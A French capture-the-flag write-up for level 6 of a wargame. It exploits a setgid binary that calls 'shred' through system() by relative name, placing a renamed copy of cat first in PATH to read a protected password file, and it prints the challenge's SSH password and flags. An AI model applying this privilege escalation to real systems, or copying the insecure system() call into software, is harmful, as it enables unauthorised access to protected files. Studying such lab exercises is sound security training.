# Write up : Wargames

### Level 6

Consigne :

```
Consignes lvl6 :<br>
Le but de cette étape est de lire le fichier '.passwd' via l’exécutable disponible dans votre répertoire courant.

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge6@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion 

```bash
ssh -p 6666 challenge6@game1.marshack.fr
password: MARS{mMwAr48BXzwavqjItEYk7zNhTBcMGS1S}
```

Contenu de /home/challenge6

```bash
challenge6@fb0a879ee360:~$ ls -al
total 36
drwxr-x--- 1 root challenge6 4096 Jan 31 14:09 .
drwxr-xr-x 1 root root       4096 Jan 31 14:09 ..
-rw-r----- 1 root challenge7   39 Jan 30 10:22 .passwd
-rwxr-s--x 1 root challenge7 8376 Oct 22 14:50 getflag
-rw-r----- 1 root challenge6  123 Oct 22 14:50 getflag.c
```

Contenu du fichier  getflag.c

```C
challenge6@be9f0e178887:~$ cat getflag.c
#include <stdio.h>
#include <stdlib.h>

int             main(int ac, char **av)
{
  system("shred -vun 420 .passwd");
  return (0);
}
```

Vulnérabilité : Le binaire appelé par system a un chemin relatif.



Commandes pour :

- Création d'un dossier dans le répertoire :  test
- Copy de /bin/cat dans le répertoire /home/test
- Renommage de /home/test/cat en /home/test/shred
- Permission d'exécution (x) sur le binaire /home/test/shred

```bash
challenge6@be9f0e178887:~$ /bin/mkdir /tmp/test
challenge6@be9f0e178887:~$ cp /bin/cat /tmp/test
challenge6@be9f0e178887:~$ mv /tmp/test/cat /tmp/test/shred
challenge6@be9f0e178887:~$ chmod -R 755 /tmp/test
```

Modifier sa variable d' environnement PATH comme suit : 

```
PATH=/tmp/test
```

Exécution de /home/challenge6/getflag  

```
challenge6@be9f0e178887:~$ ./getflag

Solution : 
shred: 420: No such file or directory
     1	MARS{bpLMB4IxDzGAJ9kXpVyPVXlxp4u999Gu}

```


Résultat : MARS{bpLMB4IxDzGAJ9kXpVyPVXlxp4u999Gu}